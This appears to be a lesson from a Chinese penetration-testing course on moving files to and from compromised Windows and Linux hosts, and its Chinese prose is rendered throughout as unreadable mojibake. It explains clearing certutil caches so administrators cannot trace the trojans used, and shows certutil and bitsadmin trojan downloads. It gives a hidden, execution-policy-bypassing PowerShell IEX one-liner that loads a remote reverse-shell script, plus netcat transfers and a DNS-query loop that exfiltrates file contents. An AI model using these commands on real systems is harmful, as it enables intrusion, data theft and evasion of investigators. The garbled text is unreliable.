# ğŸ› ï¸ è¯¾ç¨‹P60ï¼šç¬¬26å¤© - ç³»ç»Ÿæ–‡ä»¶ä¼ è¾“æ–¹æ³•è¯¦è§£

![](img/926f6e594ba6daa8d534b730eec7335d_1.png)

![](img/926f6e594ba6daa8d534b730eec7335d_3.png)

![](img/926f6e594ba6daa8d534b730eec7335d_5.png)

![](img/926f6e594ba6daa8d534b730eec7335d_6.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ åœ¨Windowså’ŒLinuxç³»ç»Ÿä¸‹ï¼Œåˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦å·¥å…·æˆ–è„šæœ¬ç¯å¢ƒè¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„å„ç§æ–¹æ³•ã€‚è¿™äº›æŠ€å·§åœ¨æ¸—é€æµ‹è¯•å’Œæ—¥å¸¸è¿ç»´ä¸­è‡³å…³é‡è¦ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬åœ¨å—é™ç¯å¢ƒä¸‹ä¸Šä¼ æˆ–ä¸‹è½½æ‰€éœ€æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_8.png)

---

![](img/926f6e594ba6daa8d534b730eec7335d_10.png)

## ğŸªŸ Windowsç³»ç»Ÿä¸‹çš„æ–‡ä»¶ä¼ è¾“

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ¦‚è¿°äº†è¯¾ç¨‹å†…å®¹ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹Windowsç³»ç»Ÿä¸‹å¸¸ç”¨çš„æ–‡ä»¶ä¼ è¾“æ–¹æ³•ã€‚Windowsç³»ç»Ÿè‡ªå¸¦äº†è®¸å¤šå‘½ä»¤è¡Œå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œæ— éœ€é¢å¤–å®‰è£…è½¯ä»¶ã€‚

### æ¸…é™¤æ“ä½œç—•è¿¹

![](img/926f6e594ba6daa8d534b730eec7335d_12.png)

![](img/926f6e594ba6daa8d534b730eec7335d_14.png)

æ‰§è¡ŒæŸäº›æ“ä½œåï¼Œéœ€è¦æ¸…é™¤ç³»ç»Ÿç¼“å­˜ä»¥éšè—æˆ‘ä»¬çš„æ´»åŠ¨ç—•è¿¹ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯é¿å…ç®¡ç†å‘˜åœ¨åç»­æº¯æºæ—¶ï¼Œå‘ç°æˆ‘ä»¬ä½¿ç”¨çš„æœ¨é©¬æˆ–æ”»å‡»æ–¹æ³•ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_16.png)

![](img/926f6e594ba6daa8d534b730eec7335d_18.png)

![](img/926f6e594ba6daa8d534b730eec7335d_20.png)

![](img/926f6e594ba6daa8d534b730eec7335d_22.png)

ä¾‹å¦‚ï¼Œç³»ç»Ÿç¼“å­˜ç›®å½•å¯èƒ½è®°å½•äº†æ‰€ä½¿ç”¨çš„æœ¨é©¬å†…å®¹ã€‚ç®¡ç†å‘˜è¿›è¡Œæ¸—é€æµ‹è¯•åçš„æº¯æºåˆ†ææ—¶ï¼Œå¯ä»¥æ£€æŸ¥è¿™äº›ç›®å½•ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‰¹å®šå‘½ä»¤æ¥æ¸…é™¤è¿™äº›ç¼“å­˜ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_24.png)

![](img/926f6e594ba6daa8d534b730eec7335d_26.png)

æ¸…é™¤ç¼“å­˜çš„å‘½ä»¤å¾ˆç®€å•ï¼Œåœ¨åŸºç¡€å‘½ä»¤åæ·»åŠ  `/del` æˆ– `-delete` å‚æ•°å³å¯ã€‚æ‰§è¡Œåï¼ŒåŸæœ¬å­˜åœ¨äºç›®å½•ä¸‹çš„ç¼“å­˜æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œä»è€Œæ¸…é™¤äº†æ“ä½œç—•è¿¹ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_28.png)

### åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤è¡Œå·¥å…·

![](img/926f6e594ba6daa8d534b730eec7335d_30.png)

![](img/926f6e594ba6daa8d534b730eec7335d_32.png)

![](img/926f6e594ba6daa8d534b730eec7335d_34.png)

å‰é¢çš„æ–¹æ³•åˆ©ç”¨äº†Windowsç³»ç»Ÿè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·ã€‚è¿™äº›å·¥å…·æ˜¯ç³»ç»ŸåŸç”Ÿå­˜åœ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥ä¸‹è½½å·²ç”Ÿæˆå¥½çš„æœ¨é©¬æˆ–å…¶ä»–å·¥å…·æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_36.png)

![](img/926f6e594ba6daa8d534b730eec7335d_38.png)

ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„æ–¹æ³•ï¼š

1.  **Certutilå·¥å…·**ï¼š
    `certutil -urlcache -split -f http://example.com/file.exe localfile.exe`
    æ­¤å‘½ä»¤å¯ç”¨äºä»æŒ‡å®šURLä¸‹è½½æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_40.png)

2.  **Bitsadminå·¥å…·**ï¼š
    `bitsadmin /transfer myJob http://example.com/file.exe C:\localfile.exe`
    æ­¤å‘½ä»¤åˆ©ç”¨åå°æ™ºèƒ½ä¼ è¾“æœåŠ¡ä¸‹è½½æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_42.png)

![](img/926f6e594ba6daa8d534b730eec7335d_44.png)

3.  **PowerShell**ï¼š
    è¿™æ˜¯åŠŸèƒ½éå¸¸å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚è¯¦ç»†è®²è§£ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_46.png)

![](img/926f6e594ba6daa8d534b730eec7335d_48.png)

![](img/926f6e594ba6daa8d534b730eec7335d_50.png)

![](img/926f6e594ba6daa8d534b730eec7335d_52.png)

---

![](img/926f6e594ba6daa8d534b730eec7335d_54.png)

![](img/926f6e594ba6daa8d534b730eec7335d_56.png)

![](img/926f6e594ba6daa8d534b730eec7335d_58.png)

## âš¡ ä½¿ç”¨PowerShellè¿›è¡Œæ–‡ä»¶ä¼ è¾“

![](img/926f6e594ba6daa8d534b730eec7335d_60.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†åŸºç¡€çš„Windowså‘½ä»¤è¡Œå·¥å…·ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬é‡ç‚¹çœ‹çœ‹åŠŸèƒ½æ›´å¼ºå¤§çš„PowerShellã€‚åœ¨ä¿¡æ¯æ”¶é›†é˜¶æ®µæˆ‘ä»¬å·²ç»æ¥è§¦è¿‡å®ƒï¼Œç°åœ¨å­¦ä¹ å¦‚ä½•ç”¨å®ƒè¿›è¡Œæ–‡ä»¶ä¸‹è½½ä¸æ‰§è¡Œã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_62.png)

![](img/926f6e594ba6daa8d534b730eec7335d_64.png)

### PowerShellåŸºç¡€ä¸å¯¹è±¡åˆ›å»º

![](img/926f6e594ba6daa8d534b730eec7335d_66.png)

![](img/926f6e594ba6daa8d534b730eec7335d_68.png)

![](img/926f6e594ba6daa8d534b730eec7335d_70.png)

![](img/926f6e594ba6daa8d534b730eec7335d_72.png)

é¦–å…ˆï¼Œåœ¨cmdä¸­ç›´æ¥è¾“å…¥ `powershell` å³å¯è¿›å…¥PowerShellç¯å¢ƒã€‚å…¶å‘½ä»¤è¡Œæç¤ºç¬¦å‰é€šå¸¸æœ‰ä¸€ä¸ª `PS` æ ‡è¯†ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_74.png)

![](img/926f6e594ba6daa8d534b730eec7335d_76.png)

![](img/926f6e594ba6daa8d534b730eec7335d_78.png)

æˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ªè¯­å¥ï¼Œå®ƒå°†æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åˆ†æˆäº†ä¸¤éƒ¨åˆ†ä»¥ä¾¿ç†è§£ï¼š
```powershell
$p = New-Object System.Net.WebClient
```
ç¬¬ä¸€éƒ¨åˆ†é€šè¿‡ `New-Object` åˆ›å»ºäº†ä¸€ä¸ª `System.Net.WebClient` å¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡ `$p`ï¼ˆ`$`ç¬¦å·è¡¨ç¤ºå˜é‡ï¼‰ã€‚`New-Object` ç”¨äºåˆ›å»ºå¯¹è±¡å®ä¾‹ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_80.png)

![](img/926f6e594ba6daa8d534b730eec7335d_82.png)

![](img/926f6e594ba6daa8d534b730eec7335d_84.png)

![](img/926f6e594ba6daa8d534b730eec7335d_85.png)

`System.Net.WebClient` å¯¹è±¡æä¾›äº†ç”¨äºå‘é€å’Œæ¥æ”¶URIæ ‡è¯†èµ„æºæ•°æ®çš„å¸¸ç”¨æ–¹æ³•ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å¯¹è±¡æ¥è¯·æ±‚å¹¶ä¸‹è½½ç½‘ç»œèµ„æºã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_87.png)

![](img/926f6e594ba6daa8d534b730eec7335d_89.png)

å¦‚æœä¸ç†è§£è¿™éƒ¨åˆ†ï¼Œå¯ä»¥å‚è€ƒé¢„ä¹ èµ„æ–™ä¸­çš„PowerShellå®˜æ–¹æ–‡æ¡£å’Œå…³äºå¸¸ç”¨.NETå¯¹è±¡çš„æ–‡ç« ï¼Œå…¶ä¸­è¯¦ç»†è¯´æ˜äº† `System.Net.WebClient` çš„ä½œç”¨ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_91.png)

![](img/926f6e594ba6daa8d534b730eec7335d_93.png)

### ä¸‹è½½æ–‡ä»¶çš„æ–¹æ³•

![](img/926f6e594ba6daa8d534b730eec7335d_95.png)

åˆ›å»ºå¯¹è±¡åï¼Œç¬¬äºŒéƒ¨åˆ†è°ƒç”¨è¯¥å¯¹è±¡çš„ `DownloadFile` æ–¹æ³•ï¼š
```powershell
$p.DownloadFile("http://example.com/file.hta", ".\file.hta")
```
`DownloadFile` æ˜¯è¯¥å¯¹è±¡æä¾›çš„æ–¹æ³•ï¼Œä»å­—é¢æ„æ€å¯çŸ¥å…¶ç”¨äºä¸‹è½½æ–‡ä»¶ã€‚å®ƒä¼šè·å–æŒ‡å®šURLçš„èµ„æºï¼Œå¹¶ä¿å­˜åˆ°æœ¬åœ°æŒ‡å®šè·¯å¾„ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_97.png)

![](img/926f6e594ba6daa8d534b730eec7335d_99.png)

![](img/926f6e594ba6daa8d534b730eec7335d_101.png)

æˆ‘ä»¬ä»¥ä¸‹è½½ä¸€ä¸ª `44.hta` æ–‡ä»¶ä¸ºä¾‹ã€‚æ‰§è¡Œä¸Šè¿°ä¸¤æ¡å‘½ä»¤åï¼Œå³å¯åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆè¯¥æ–‡ä»¶ï¼Œè¡¨æ˜ä¸‹è½½æˆåŠŸã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_103.png)

![](img/926f6e594ba6daa8d534b730eec7335d_105.png)

![](img/926f6e594ba6daa8d534b730eec7335d_107.png)

### åˆå¹¶å‘½ä»¤ä¸å¸¸ç”¨å‚æ•°

![](img/926f6e594ba6daa8d534b730eec7335d_109.png)

![](img/926f6e594ba6daa8d534b730eec7335d_111.png)

![](img/926f6e594ba6daa8d534b730eec7335d_113.png)

![](img/926f6e594ba6daa8d534b730eec7335d_115.png)

å®é™…æ“ä½œä¸­ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦åœ¨éæŒä¹…åŒ–çš„PowerShellç¯å¢ƒä¸‹ï¼ˆå¦‚é€šè¿‡Cobalt Strikeæ‰§è¡Œå•æ¡å‘½ä»¤ï¼‰å®Œæˆä¸‹è½½ã€‚è¿™æ—¶ï¼Œå°†å¤šæ¡è¯­å¥åˆå¹¶ä¸ºä¸€è¡Œæ›´ä¸ºæ–¹ä¾¿ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_117.png)

![](img/926f6e594ba6daa8d534b730eec7335d_119.png)

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `-c`ï¼ˆæˆ– `-Command`ï¼‰å‚æ•°æ¥æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤å­—ç¬¦ä¸²ï¼š
```powershell
powershell -c "$p=New-Object System.Net.WebClient;$p.DownloadFile('http://example.com/44.hta','44.hta')"
```
è¿™æ¡å‘½ä»¤é€šè¿‡åˆ†å·åˆ†éš”ï¼Œå°†å¯¹è±¡åˆ›å»ºå’Œä¸‹è½½æ“ä½œåˆå¹¶åœ¨ä¸€è¡Œä¸­æ‰§è¡Œã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_121.png)

![](img/926f6e594ba6daa8d534b730eec7335d_123.png)

![](img/926f6e594ba6daa8d534b730eec7335d_125.png)

`-c` æ˜¯PowerShellçš„ä¸€ä¸ªå¸¸ç”¨å‚æ•°ï¼Œè¡¨ç¤ºæ‰§è¡Œåç»­å­—ç¬¦ä¸²ä¸­çš„å‘½ä»¤ã€‚å¯ä»¥é€šè¿‡ `powershell -?` æŸ¥çœ‹æ‰€æœ‰å¯ç”¨å‚æ•°åŠå…¶è¯´æ˜ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_127.png)

![](img/926f6e594ba6daa8d534b730eec7335d_129.png)

### å…¶ä»–ä¸‹è½½å†™æ³•ä¸Invoke-WebRequest

![](img/926f6e594ba6daa8d534b730eec7335d_131.png)

![](img/926f6e594ba6daa8d534b730eec7335d_133.png)

é™¤äº† `WebClient`ï¼ŒPowerShellè¿˜æœ‰æ›´ç®€æ´çš„å†™æ³•ï¼š
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://example.com/44.hta', 's.txt')
```
å…¶ä½œç”¨ä¸å‰è¿°æ–¹æ³•ç›¸åŒï¼Œåªæ˜¯è¯­æ³•æ›´ç®€æ´ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_135.png)

![](img/926f6e594ba6daa8d534b730eec7335d_137.png)

![](img/926f6e594ba6daa8d534b730eec7335d_139.png)

![](img/926f6e594ba6daa8d534b730eec7335d_141.png)

![](img/926f6e594ba6daa8d534b730eec7335d_143.png)

å¦ä¸€ç§å¸¸ç”¨çš„æ–¹æ³•æ˜¯ä½¿ç”¨ `Invoke-WebRequest` cmdletï¼š
```powershell
powershell -c "Invoke-WebRequest -Uri http://example.com/44.hta -OutFile D:\44.hta"
```
`Invoke-WebRequest` å¯ç”¨äºå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚é€šè¿‡ `-OutFile` å‚æ•°å¯å°†è¯·æ±‚çš„èµ„æºä¿å­˜ä¸ºæœ¬åœ°æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_145.png)

æˆ‘ä»¬å¯ä»¥é€šè¿‡ `help Invoke-WebRequest` å‘½ä»¤æŸ¥çœ‹å…¶è¯¦ç»†ç”¨æ³•ã€‚å…¶ä¸­ï¼Œ`-Uri` æŒ‡å®šèµ„æºåœ°å€ï¼Œ`-OutFile` æŒ‡å®šæœ¬åœ°ä¿å­˜è·¯å¾„ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_147.png)

![](img/926f6e594ba6daa8d534b730eec7335d_149.png)

**æ³¨æ„**ï¼šåœ¨cmdç¯å¢ƒä¸­è°ƒç”¨PowerShellå‘½ä»¤æ—¶ï¼Œéœ€è¦åœ¨å‘½ä»¤å‰åŠ ä¸Š `powershell`ã€‚å¦‚æœå·²å¤„äºPowerShellç¯å¢ƒä¸­ï¼Œåˆ™æ— éœ€æ·»åŠ ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚

### åˆ«åä¸è¿œç¨‹è„šæœ¬åŠ è½½

`Invoke-WebRequest` æœ‰åˆ«å `iwr` å’Œ `wget`ï¼Œå®ƒä»¬çš„åŠŸèƒ½æ˜¯ç­‰ä»·çš„ï¼š
```powershell
powershell -c "iwr http://example.com/44.hta -OutFile 44.hta"
powershell -c "wget http://example.com/44.hta -OutFile 44.hta"
```
å¦‚æœè®°ä¸ä½é•¿å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨è¿™äº›åˆ«åã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_151.png)

![](img/926f6e594ba6daa8d534b730eec7335d_153.png)

![](img/926f6e594ba6daa8d534b730eec7335d_155.png)

![](img/926f6e594ba6daa8d534b730eec7335d_157.png)

PowerShellçš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½æ˜¯èƒ½ç›´æ¥åŠ è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚ä¾‹å¦‚ï¼ŒåŠ è½½ä¸€ä¸ªè¿œç¨‹çš„PowerShellè„šæœ¬æ¥åå¼¹Shellï¼š
```powershell
powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com/shell.ps1')"
```
*   `-w hidden`ï¼šéšè—æ‰§è¡Œçª—å£ã€‚
*   `-exec bypass`ï¼šç»•è¿‡æ‰§è¡Œç­–ç•¥é™åˆ¶ã€‚
*   `IEX`ï¼š`Invoke-Expression` çš„åˆ«åï¼Œå°†å­—ç¬¦ä¸²ä½œä¸ºå‘½ä»¤æ‰§è¡Œã€‚
*   `DownloadString`ï¼šå°†è¿œç¨‹è„šæœ¬å†…å®¹åŠ è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œï¼Œæ— æ–‡ä»¶è½åœ°ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_159.png)

![](img/926f6e594ba6daa8d534b730eec7335d_161.png)

Windowsé»˜è®¤æ‰§è¡Œç­–ç•¥å¯èƒ½ç¦æ­¢è¿è¡Œè„šæœ¬ã€‚é€šè¿‡ `-exec bypass` å¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚å…¶ä»–ç­–ç•¥åŒ…æ‹¬ `Restricted`ï¼ˆé»˜è®¤ï¼Œç¦æ­¢è„šæœ¬ï¼‰ã€`RemoteSigned`ï¼ˆå…è®¸æœ¬åœ°å’Œç­¾åè¿œç¨‹è„šæœ¬ï¼‰ç­‰ã€‚

---

![](img/926f6e594ba6daa8d534b730eec7335d_163.png)

![](img/926f6e594ba6daa8d534b730eec7335d_165.png)

![](img/926f6e594ba6daa8d534b730eec7335d_167.png)

## ğŸ§ Linuxç³»ç»Ÿä¸‹çš„æ–‡ä»¶ä¼ è¾“

![](img/926f6e594ba6daa8d534b730eec7335d_169.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬æ·±å…¥æ¢è®¨äº†Windowsä¸‹çš„PowerShellï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬è½¬å‘Linuxç³»ç»Ÿã€‚ç›¸æ¯”Windowsï¼ŒLinuxä¸‹çš„æ–‡ä»¶ä¼ è¾“å‘½ä»¤é€šå¸¸æ›´ä¸ºç®€å•ç›´æ¥ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_171.png)

![](img/926f6e594ba6daa8d534b730eec7335d_172.png)

![](img/926f6e594ba6daa8d534b730eec7335d_174.png)

ä»¥ä¸‹æ˜¯Linuxä¸‹å¸¸ç”¨çš„æ–‡ä»¶ä¸‹è½½å‘½ä»¤ï¼š

![](img/926f6e594ba6daa8d534b730eec7335d_176.png)

![](img/926f6e594ba6daa8d534b730eec7335d_178.png)

1.  **wgetå‘½ä»¤**ï¼š
    æœ€å¸¸ç”¨çš„ä¸‹è½½å·¥å…·ä¹‹ä¸€ã€‚
    ```bash
    wget http://example.com/file.txt
    wget -O newname.txt http://example.com/file.txt
    ```
    ä½¿ç”¨ `-O` å‚æ•°å¯ä»¥æŒ‡å®šä¿å­˜çš„æ–‡ä»¶åã€‚

2.  **curlå‘½ä»¤**ï¼š
    å¼ºå¤§çš„ç½‘ç»œæ•°æ®ä¼ è¾“å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®®ã€‚
    ```bash
    curl -o file.txt http://example.com/file.txt
    curl http://example.com/file.txt > file.txt
    ```

3.  **nc (netcat) å‘½ä»¤**ï¼š
    â€œç½‘ç»œç‘å£«å†›åˆ€â€ï¼Œä¹Ÿå¯ç”¨äºæ–‡ä»¶ä¼ è¾“ã€‚
    *   **å‘é€æ–‡ä»¶**ï¼ˆæ¥æ”¶æ–¹ç›‘å¬ï¼‰ï¼š
        ```bash
        # æ¥æ”¶æ–¹ç›‘å¬ç«¯å£
        nc -lvp 1234 > received_file
        # å‘é€æ–¹å‘é€æ–‡ä»¶
        cat file_to_send | nc æ¥æ”¶æ–¹IP 1234
        ```
    *   **æ¥æ”¶æ–‡ä»¶**ï¼ˆå‘é€æ–¹ç›‘å¬ï¼‰ï¼š
        ```bash
        # å‘é€æ–¹ç›‘å¬å¹¶å‡†å¤‡æ–‡ä»¶
        nc -lvp 1234 < file_to_send
        # æ¥æ”¶æ–¹è¿æ¥å¹¶è·å–æ–‡ä»¶
        nc å‘é€æ–¹IP 1234 > received_file
        ```
    å…¶åŸç†æ˜¯åˆ©ç”¨ç®¡é“ `|` å’Œé‡å®šå‘ `>` å°†æ–‡ä»¶å†…å®¹é€šè¿‡ç½‘ç»œç«¯å£ä¼ é€’ã€‚

4.  **sftpå‘½ä»¤**ï¼š
    åŸºäºSSHçš„å®‰å…¨æ–‡ä»¶ä¼ è¾“ã€‚
    ```bash
    sftp user@remote_host
    sftp -P 2222 user@remote_host
    sftp -i private_key user@remote_host
    ```
    ä½¿ç”¨ `-P` æŒ‡å®šç«¯å£ï¼Œ`-i` æŒ‡å®šç§é’¥æ–‡ä»¶è¿›è¡Œå…å¯†ç™»å½•ã€‚

5.  **DNSéš§é“ä¼ è¾“æ•°æ®ï¼ˆæŠ€å·§ï¼‰**ï¼š
    ä¸€ä¸ªç‰¹æ®ŠæŠ€å·§ï¼Œé€šè¿‡DNSæŸ¥è¯¢æ³„éœ²æ•°æ®ã€‚
    ```bash
    cat test.txt | xxd -p -c 16 | while read line; do dig $line.domain.com; done
    ```
    *   `xxd -p -c 16`ï¼šå°†æ–‡ä»¶å†…å®¹æ¯16å­—èŠ‚è½¬æ¢ä¸ºä¸€è¡Œåå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚
    *   `while read line; do ... done`ï¼šå¾ªç¯è¯»å–æ¯ä¸€è¡Œã€‚
    *   `dig $line.domain.com`ï¼šå°†æ¯è¡Œæ•°æ®ä½œä¸ºå­åŸŸåè¿›è¡ŒDNSæŸ¥è¯¢ï¼Œæ•°æ®ä¼šè®°å½•åœ¨DNSæ—¥å¿—ä¸­ã€‚
    æ”»å‡»è€…å¯åœ¨DNSæ—¥å¿—å¹³å°æ”¶é›†è¿™äº›å­åŸŸåè®°å½•ï¼Œç„¶åé‡ç»„å¹¶è§£ç åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå³å¯è·å–æ–‡ä»¶å†…å®¹ã€‚è¿™ç§æ–¹æ³•å¸¸ç”¨äºæ— å¤–ç½‘å‡ºå£æ—¶çš„æ•°æ®å¤–å¸¦ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_180.png)

![](img/926f6e594ba6daa8d534b730eec7335d_182.png)

---

## ğŸ“œ åˆ©ç”¨è„šæœ¬è¯­è¨€è¿›è¡Œæ–‡ä»¶ä¼ è¾“

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†Linuxä¸‹çš„å„ç§å‘½ä»¤ï¼Œæœ¬èŠ‚æˆ‘ä»¬çœ‹çœ‹å½“ç³»ç»Ÿå‘½ä»¤ä¸å¯ç”¨æ—¶ï¼Œå¦‚ä½•åˆ©ç”¨å¸¸è§çš„è„šæœ¬è¯­è¨€ç¯å¢ƒè¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚åœ¨WebæœåŠ¡å™¨ç­‰ç¯å¢ƒä¸­ï¼Œé€šå¸¸å­˜åœ¨PHPã€Pythonç­‰è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_184.png)

![](img/926f6e594ba6daa8d534b730eec7335d_186.png)

![](img/926f6e594ba6daa8d534b730eec7335d_187.png)

![](img/926f6e594ba6daa8d534b730eec7335d_189.png)

### PHP

![](img/926f6e594ba6daa8d534b730eec7335d_191.png)

![](img/926f6e594ba6daa8d534b730eec7335d_193.png)

![](img/926f6e594ba6daa8d534b730eec7335d_194.png)

![](img/926f6e594ba6daa8d534b730eec7335d_195.png)

![](img/926f6e594ba6daa8d534b730eec7335d_197.png)

![](img/926f6e594ba6daa8d534b730eec7335d_199.png)

åˆ©ç”¨ `file_get_contents` å’Œ `file_put_contents` å‡½æ•°ã€‚
```php
<?php
    $content = file_get_contents('http://example.com/file.txt');
    file_put_contents('local.txt', $content);
?>
```
*   `file_get_contents`ï¼šå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²ã€‚
*   `file_put_contents`ï¼šå°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_201.png)

![](img/926f6e594ba6daa8d534b730eec7335d_203.png)

å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œä½¿ç”¨ `-r` å‚æ•°æ‰§è¡ŒPHPä»£ç ï¼Œæ— éœ€ `<?php ?>` æ ‡ç­¾ï¼š
```bash
php -r "$c=file_get_contents('http://example.com/file.txt'); file_put_contents('local.txt',$c);"
```

![](img/926f6e594ba6daa8d534b730eec7335d_205.png)

![](img/926f6e594ba6daa8d534b730eec7335d_207.png)

![](img/926f6e594ba6daa8d534b730eec7335d_209.png)

### Python

![](img/926f6e594ba6daa8d534b730eec7335d_210.png)

![](img/926f6e594ba6daa8d534b730eec7335d_212.png)

Pythonä½¿ç”¨ `urllib` æˆ– `requests` åº“ã€‚
```bash
# Python 2
python -c "import urllib; urllib.urlretrieve('http://example.com/file.txt', 'local.txt')"

![](img/926f6e594ba6daa8d534b730eec7335d_214.png)

# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://example.com/file.txt', 'local.txt')"
```
`-c` å‚æ•°å…è®¸åœ¨å‘½ä»¤è¡Œä¸­ç›´æ¥æ‰§è¡ŒPythonä»£ç ã€‚

### Perl å’Œ Ruby

![](img/926f6e594ba6daa8d534b730eec7335d_216.png)

![](img/926f6e594ba6daa8d534b730eec7335d_218.png)

è¿™ä¸¤ç§è„šæœ¬è¯­è¨€ä¹Ÿèƒ½å®ç°ç±»ä¼¼åŠŸèƒ½ã€‚
```bash
# Perl
perl -e "use LWP::Simple; getstore('http://example.com/file.txt', 'local.txt');"

![](img/926f6e594ba6daa8d534b730eec7335d_220.png)

![](img/926f6e594ba6daa8d534b730eec7335d_222.png)

# Ruby
ruby -e "require 'open-uri'; File.write('local.txt', URI.open('http://example.com/file.txt').read)"
```

**æ ¸å¿ƒæ€è·¯**ï¼šå½“ç›®æ ‡ç³»ç»Ÿå­˜åœ¨ç‰¹å®šçš„è„šæœ¬è¿è¡Œç¯å¢ƒï¼ˆå¦‚WebæœåŠ¡å™¨å¸¸å¤‡PHPã€Pythonï¼‰ä½†ç¼ºå°‘ç³»ç»Ÿä¸‹è½½å‘½ä»¤æ—¶ï¼Œä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è¿™äº›ç¯å¢ƒå¯¹åº”çš„è„šæœ¬è¯­è¨€æ¥å®Œæˆä»»åŠ¡ã€‚

---

![](img/926f6e594ba6daa8d534b730eec7335d_224.png)

![](img/926f6e594ba6daa8d534b730eec7335d_226.png)

## ğŸ“ æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†åœ¨ä¸åŒæ“ä½œç³»ç»Ÿç¯å¢ƒä¸‹è¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„å¤šç§æ–¹æ³•ã€‚

![](img/926f6e594ba6daa8d534b730eec7335d_228.png)

*   åœ¨ **Windows** ä¸‹ï¼Œæˆ‘ä»¬ä¸»è¦åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ `certutil`ã€`bitsadmin` ä»¥åŠåŠŸèƒ½å¼ºå¤§çš„ **PowerShell**ã€‚PowerShellå¯ä»¥é€šè¿‡ `WebClient` å¯¹è±¡ã€`Invoke-WebRequest` ä»¥åŠè¿œç¨‹åŠ è½½è„šæœ¬ (`IEX + DownloadString`) ç­‰æ–¹å¼çµæ´»åœ°ä¸‹è½½æ–‡ä»¶æˆ–æ‰§è¡Œä»£ç ï¼Œå¹¶éœ€è¦æ³¨æ„æ‰§è¡Œç­–ç•¥å’Œéšè—çª—å£ç­‰å‚æ•°ã€‚
